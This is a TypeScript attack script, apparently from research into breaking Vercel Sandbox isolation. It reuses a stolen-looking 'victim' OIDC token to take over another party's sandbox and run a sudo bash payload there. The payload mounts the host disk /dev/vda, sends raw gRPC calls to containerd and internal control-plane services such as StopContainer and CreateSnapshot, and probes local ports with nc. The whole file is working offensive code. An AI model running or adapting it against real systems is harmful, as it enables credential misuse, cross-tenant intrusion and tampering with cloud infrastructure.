import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
G="printf '\\x00\\x00\\x00\\x00\\x00'"
grpc_call() {
  local host=$1 path=$2
  timeout 5 curl -s --http2-prior-knowledge -X POST "http://$host$path" \
    -H 'Content-Type: application/grpc' -H 'TE: trailers' \
    --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -c 300
}
echo "===== containerd.sock gRPC (h2c) via mount ====="
for path in \
  /containerd.services.containers.v1.Containers/List \
  /containerd.services.images.v1.Images/List \
  /containerd.services.namespaces.v1.Namespaces/List \
  /containerd.services.tasks.v1.Tasks/List \
  /containerd.services.introspection.v1.Introspection/Plugins; do
  echo "--- containerd$path ---"
  grpc_call "containerd" "$path"; echo
done
echo
echo "===== TCP 30002 gRPC (h2c) ====="
for path in \
  /vercel.hive.celld.api.v1.CelldService/RegisterPort \
  /vercel.hive.celld.api.v1.CelldService/StopContainer \
  /vercel.hive.celld.api.v1.CelldService/WaitContainer \
  /vercel.hive.host.api.v1.HostService/CreateSnapshot \
  /vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig \
  /vercel.hive.cell.api.processes.v1.ProcessService/ \
  /containerd.services.containers.v1.Containers/List; do
  echo "--- :30002$path ---"
  timeout 5 curl -s --http2-prior-knowledge -X POST "http://cell$path" \
    -H 'Content-Type: application/grpc' -H 'TE: trailers' \
    --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>&1 | head -c 300; echo
done
echo
echo "===== TCP 30001/23456 connect GET paths ====="
for port in 23456 30001; do
  for p in /healthz /ping /version /status /v1 /api /metrics /debug/pprof/ /vercel.hive.celld.api.v1.CelldService/RegisterPort; do
    r=$(printf "GET $p HTTP/1.0\r\nHost: x\r\n\r\n" | timeout 2 nc 127.0.0.1 $port 2>&1 | head -1)
    case "$r" in HTTP/1.*2*) echo "  :$port $p -> $r";; esac
  done
done
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore7.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore7.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });